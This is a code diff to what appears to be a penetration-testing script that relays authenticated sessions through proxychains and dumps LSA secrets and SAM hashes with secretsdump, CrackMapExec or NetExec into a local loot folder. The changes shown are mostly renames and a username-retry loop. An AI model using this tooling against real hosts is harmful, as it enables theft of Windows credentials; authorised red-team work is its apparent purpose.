@@ -38,23 +38,23 @@ def config_check():
     # this will get the location of the config file proxychains is using
     proc = subprocess.run(['proxychains -h'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
-    dat = proc.stderr.decode().split('\n')
+    proxychains_stderr = proc.stderr.decode().split('\n')
 
-    for line in dat:
+    for line in proxychains_stderr:
         if line.find('config file found') != -1:
             config_file = line[line.find(':') + 2:]
 
     try:
         with open(config_file, 'r') as f:
-            dat = f.read()
+            proyxhcains_config_dat = f.read()
             f.close()
 
-        if dat.find('socks4 127.0.0.1 1080') == -1 or dat.find('#socks4 127.0.0.1 1080') != -1 or dat.find('# socks4 127.0.0.1 1080') != -1:
-            print('{} ERROR you are missing "socks4 127.0.0.1 1080" in your proxychains config'.format(red_minus))
+        if proyxhcains_config_dat.find('socks4 127.0.0.1 1080') == -1 or proyxhcains_config_dat.find('#socks4 127.0.0.1 1080') != -1 or proyxhcains_config_dat.find('# socks4 127.0.0.1 1080') != -1:
+            print('{} ERROR you are missing "socks4 127.0.0.1 1080" in your {} config'.format(red_minus, config_file))
             sys.exit(1)
 
     except FileNotFoundError as e:
-        print('{} ERROR you are missing proxychains config'.format(red_minus))
+        print('{} ERROR you are missing a proxychains config'.format(red_minus))
         sys.exit(1)
 
 
@@ -90,20 +90,21 @@ def check_uname():
     print('Enter your attacker machine username ex. kali (this is where cme or netexec will store your loot in the home dir of whatever username you give ~/.cme/logs)')
     given_username = input('Username: ')
     with open('/etc/passwd', 'r') as f:
-        dat = f.readlines()
+        etc_data = f.readlines()
         f.close()
     # this gets all the usernames in /etc/passwd into a list ex ['root', 'www-data', 'kali']
     passwd_usernames = []
-    for item in dat:
-        passwd_usernames.append(str(item.split(':')[0]))
+    for etc_item in etc_data:
+        passwd_usernames.append(str(etc_item.split(':')[0]))
 
     # iterates through the passwd_usernames list and sees if the given username is equal to any in it
-    for name in passwd_usernames:
-        if given_username == name:
+    while True:
+        if given_username in passwd_usernames:
             return given_username
-
-    print('{} Username does not exist in /etc/passwd'.format(red_minus))
-    check_uname()
+        else:
+            print('{} Username does not exist in /etc/passwd'.format(red_minus))
+            print('\nEnter your attacker machine username ex. kali (this is where cme or netexec will store your loot in the home dir of whatever username you give ~/.cme/logs)')
+            given_username = input('Username: ')
 
 if __name__ == '__main__':
     if os.geteuid() != 0:
@@ -122,13 +123,14 @@ if __name__ == '__main__':
         print('You must enter a path for secretsdump.py')
         sys.exit(1)
 
-    if os.path.isdir("{}/loot".format(cwd)) == False:
+    if not os.path.isdir("{}/loot".format(cwd)):
         os.makedirs("{}/loot".format(cwd))
 
     config_check()
-    local_uname = ''
+
+    attack_uname = ''
     if options.method == 'crackmapexec' or options.method == 'netexec':
-        local_uname = check_uname()
+        attack_uname = check_uname()
 
     if options.method == 'secretsdump' and os.path.isfile(options.sdp) == False:
         print('Missing secretsdump.py')
@@ -164,7 +166,7 @@ if __name__ == '__main__':
 
                     # dat[0] = protocol dat[1] = ip dat[2] = domain/username dat[3] = adminstatus
 
-                    if os.path.isdir("{}/loot".format(cwd)) == False:
+                    if not os.path.isdir("{}/loot".format(cwd)):
                         os.makedirs("{}/loot".format(cwd))
 
                     with concurrent.futures.ProcessPoolExecutor(max_workers=options.threads) as executor:  # multithreading yeahhhh
@@ -176,7 +178,7 @@ if __name__ == '__main__':
 
                                     # lsa secrets and sam dump courtesy of secretsdump
                                     try:
-                                        executor.submit(mt_execute, dat[2], dat[1], options.method, options.sdp, local_uname)
+                                        executor.submit(mt_execute, dat[2], dat[1], options.method, options.sdp, attack_uname)
                                     except Exception as e:
                                         print(str(e))
                                         print('Error dumping secrets')
